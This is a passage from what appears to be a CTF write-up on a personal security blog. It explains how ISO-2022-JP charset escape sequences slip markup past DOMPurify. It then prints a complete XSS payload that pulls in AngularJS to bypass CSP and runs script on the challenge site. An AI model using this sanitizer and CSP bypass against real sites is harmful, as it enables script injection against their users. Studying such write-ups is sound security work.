      <span class="nx">regExpTest</span><span class="p">(</span><span class="sr">/&lt;</span><span class="se">[/\w]</span><span class="sr">/g</span><span class="p">,</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span>
    <span class="p">)</span> <span class="p">{</span>
      <span class="nx">_forceRemove</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">);</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div> <p>At this point i’ve realized that, indeed, we are not parsing via the standard UTF-8. Maybe we can leverage some sequences of the ISO-2022-JP in order to create a valid tag for the browser that will skip the DOMPurify check.</p> <p>If you have read the research, you may know that the <mark style="background: #FFB86CA6;">sequence</mark> <code class="language-plaintext highlighter-rouge">\x1b(B</code> is used to switch the parsing to ASCII. Hence, something like <code class="language-plaintext highlighter-rouge">&lt;style&gt;\x1b(B&lt;\x1b(Bimg&lt;/style&gt;</code> should work. And indeed it works. This payload will be left untouched from DOMPurify since it’s considered safe. Spoiler: it’s not</p> <p>Now we have all we need. I should point out that there is CSP but is easily bypassable (i’ve used cspbypass.com in order to find the payload)</p> <p>Here it is the final payload</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;&lt;/body&gt;</span>
    <span class="nt">&lt;script&gt;</span>

        <span class="kd">const</span> <span class="nx">URL</span> <span class="o">=</span> <span class="s2">`https://challenge-kinugawa.quiz.flatt.training/?html=`</span>
        <span class="kd">const</span> <span class="nx">back_to_ascii</span> <span class="o">=</span> <span class="s2">`\x1b(B`</span>
        <span class="kd">const</span> <span class="nx">back_to_jp</span> <span class="o">=</span> <span class="s2">`\x1b$B`</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">back_to_jp</span><span class="p">}</span><span class="s2">
        &lt;style&gt;
            ff</span><span class="p">${</span><span class="nx">back_to_ascii</span><span class="p">}</span><span class="s2">&lt;</span><span class="p">${</span><span class="nx">back_to_ascii</span><span class="p">}</span><span class="s2">body ng-app ng-csp&gt;
                </span><span class="p">${</span><span class="nx">back_to_ascii</span><span class="p">}</span><span class="s2">&lt;</span><span class="p">${</span><span class="nx">back_to_ascii</span><span class="p">}</span><span class="s2">script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.5/angular.js'&gt;</span><span class="p">${</span><span class="nx">back_to_ascii</span><span class="p">}</span><span class="s2">&lt;</span><span class="p">${</span><span class="nx">back_to_ascii</span><span class="p">}</span><span class="s2">/script&gt;
                    </span><span class="p">${</span><span class="nx">back_to_ascii</span><span class="p">}</span><span class="s2">&lt;</span><span class="p">${</span><span class="nx">back_to_ascii</span><span class="p">}</span><span class="s2">input autofocus ng-focus=$event.composedPath()|orderBy:'[].constructor.from([origin],alert)'&gt;
        &lt;/style&gt;`</span>

        <span class="nx">open</span><span class="p">(</span><span class="nx">URL</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">payload</span><span class="p">),</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)</span>


    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <h2 id="conclusion">Conclusion</h2> <p>It was an amazing experience. Either by solving fantastic challenges, and collaborating with skilled hackers. Last but not least, i’ve learned a lot. Which is the most important thing to me.</p> </article> <hr class="dingbat related mb6" /> <aside class="related mb4" role="complementary"> <h2 class="hr-bottom">Related Posts</h2> <ul class="related-posts"> <li class="h4"> <a href="/recap/2024/12/30/regarding-my-previous-year-part2.html" class="flip-title"><span>My previous year in infosec (part 2)</span></a> <time class="faded fine" datetime="2024-12-30T00:00:00+01:00">30 Dec 2024</time></li> <li class="h4"> <a href="/2024/06/28/r3ctf-r3gallery-writeup.html" class="flip-title"><span>R3CTF - r3gallery Writeup</span></a> <time class="faded fine" datetime="2024-06-28T00:00:00+02:00">28 Jun 2024</time></li> <li class="h4"> <a href="/2024/05/20/lake-finals-23-phishing-writeup.html" class="flip-title"><span>LakeCTF Finals 2023 - Phishing Writeup</span></a> <time class="faded fine" datetime="2024-05-20T00:00:00+02:00">20 May 2024</time></li> </ul></aside> </main> <hy-drawer id="_drawer" class="" side="left" threshold="10" noscroll > <header id="_sidebar" class="sidebar" role="banner"> <div class="sidebar-bg sidebar-overlay" style="background-color:rgb(79,177,186);background-image:url(/assets/img/sidebar-bg.jpg)"></div> <div class="sidebar-sticky"> <div class="sidebar-about"> <a class="sidebar-title" href="/"><h2 class="h1">maitai's blog</h2></a> <p class=""> BSc Computer Science Engineering Studying </p> </div> <nav class="sidebar-nav heading" role="navigation"> <span class="sr-only">Navigation:</span> <ul> </ul> </nav> <div class="sidebar-social"> <span class="sr-only">Social</span> <ul> <li> <a href="https://twitter.com/MaitaiThe" title="Twitter" class="no-mark-external"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a> </li> </ul> </div> </div> </header> </hy-drawer> <hr class="sr-only" hidden /> </hy-push-state> <!--[if gt IE 10]><!----> <script nomodule>(()=>{var t,n=document.createElement("script");!("noModule"in n)&&"onbeforeload"in n&&(t=!1,document.addEventListener("beforeload",function(e){if(e.target===n)t=!0;else if(!e.target.hasAttribute("nomodule")||!t)return;e.preventDefault()},!0),n.type="module",n.src=".",document.head.appendChild(n),n.remove())})(); </script> <script src="/assets/js/hydejack-9.2.1.js" type="module"></script> <script src="/assets/js/LEGACY-hydejack-9.2.1.js" nomodule defer></script> <!--<![endif]--> <div hidden> <h2 class="sr-only">Templates:</h2> <template id="_animation-template"> <div class="animation-main fixed-top"> <nav id="breadcrumbs" class="screen-only"><ul> </ul></nav> <div class="content"> <div class="page"></div> </div> </div> </template> <template id="_loading-template"> <div class="loading nav-btn fr"> <span class="sr-only">Loading…</span> <span class="icon-cog"></span> </div> </template> <template id="_error-template"> <div class="page"> <h1 class="page-title">Error</h1> <p class="lead"> Sorry, an error occurred while loading: <a class="this-link" href=""></a>. </p> </div> </template> <template id="_permalink-template"> <a href="#" class="permalink"> <span class="sr-only">Permalink</span> <span class="content-hash"></span> </a> </template> </div> </body></html>
